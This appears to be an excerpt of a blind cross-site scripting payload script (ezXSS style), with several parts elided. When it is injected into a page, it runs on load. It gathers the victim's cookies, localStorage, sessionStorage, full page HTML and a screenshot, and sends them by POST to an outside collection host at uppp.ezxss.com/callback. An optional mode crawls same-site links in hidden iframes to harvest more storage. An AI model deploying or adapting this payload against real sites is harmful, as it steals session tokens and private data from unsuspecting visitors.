...
function ez_cb(e, t, o) {
  o = void 0 !== o ? o : 0;
  var s, n = "https://uppp.ezxss.com/callback";
  window.XMLHttpRequest ? ((s = new XMLHttpRequest).open("POST", n, !0), s.setRequestHeader("Content-type", "text/plain")) : ((s = new ActiveXObject("Microsoft.XMLHTTP")).open("POST", n, !0), s.setRequestHeader("Content-type", "application/x-www-form-urlencoded")), s.onreadystatechange = function () {
    if (4 === s.readyState) if (200 === s.status) null !== t && t(s.responseText); else {
      var n = e;
      0 === o && (n.cookies = "", n.localstorage = "", n.sessionstorage = "", n.dom = "Error callback: " + s.status, n.screenshot = "", ez_cb(n, t, 1))
    }
  };
  try {
    s.send(ez_se(e))
...
function ez_hL() {
  ...
  try {
    ...
    var u = "";
    try {
      if (window.self !== window.top) u = "iFrame loaded via " + window.parent.location;
    } catch (e) {
  ...
  try {
    ez_rD.dom = ez_n(document.documentElement.outerHTML || document.documentElement.innerHTML)
  } catch (s) {
    ez_rD.dom = ""
  }
  try {
    ez_rD.payload = "//uppp.ezxss.com/"
  } catch (i) {
    ez_rD.payload = ""
  }
  try {
    "undefined" != typeof html2canvas ? html2canvas(document.body, {
      "max-width": 1920,
      "max-height": 1080
    }).then(function (t) {
      ez_rD.screenshot = ez_n(t.toDataURL()), y()
...
function ez_as() {
  var sm = "0";
  if ("0" !== sm) {
    var t = document.getElementsByTagName("a"), e = {};
    if ("1" === sm) {
      for (var n = [], o = 0; o < t.length; o++) try {
        var a = (c = t[o]).getAttribute("href");
        (h = s(c, a)).ez_iiv && !e[h.path] && (e[h.path] = !0, n.push(h.path))
      } catch (t) {
      }
      !function t(e) {
        e >= n.length || (ez_dc(n[e]), setTimeout((function () {
          t(e + 1)
        }), 100))
      }(0)
    } else if ("2" === sm) {
        ...
        if (!r && 0 !== n.length) {
          ...
          try {
            i.src = o, i.onload = function () {
              try {
                var a = i.contentDocument || i.contentWindow.document, c = i.contentWindow || window, h = {
                  ...
                  sessionstorage: ez_n(c.sessionStorage || window.sessionStorage),
                  localstorage: ez_n(c.localStorage || window.localStorage),
                  payload: "//uppp.ezxss.com/"
                };
                ez_cb(h, null);
                for (var l = a.getElementsByTagName("a"), u = 0; u < l.length; u++) try {
                  var d = l[u].getAttribute("href"), f = s(l[u], d);
                  f.ez_iiv && !e[f.path] && (e[f.path] = !0, n.push(f.path))
                } catch (t) {
                }
              } catch (t) {
              }
  ...
  function s(t, e) {
    if (!e || 0 === e.indexOf("#") || 0 === e.indexOf("javascript:") || 0 === e.indexOf("mailto:")) return {ez_iiv: !1};
    var n = e, o = !1;
    return "http:" !== t.protocol && "https:" !== t.protocol || t.hostname !== location.hostname ? "/" === e.charAt(0) && 0 !== e.indexOf("//") ? (o = !0, n = e) : -1 === e.indexOf("://") && 0 !== e.indexOf("//") && (o = !0, n = "/" + e) : (o = !0, n = t.pathname || e), {
      ez_iiv: o,
      path: n
    }
  }
...
function ez_se(e) {
  try {
    if ("undefined" != typeof JSON && "function" == typeof JSON.stringify) try {
    ...
    for (var t in e) if (e.hasOwnProperty(t)) {
      var r = e[t];
      if (null == r) r = ""; else if ("object" == typeof r) try {
        r = ez_n(r.toString())
      } catch (e) {
        r = ""
      } else r = ez_n(r);
...
if ("complete" === document.readyState) ez_hL(); else {
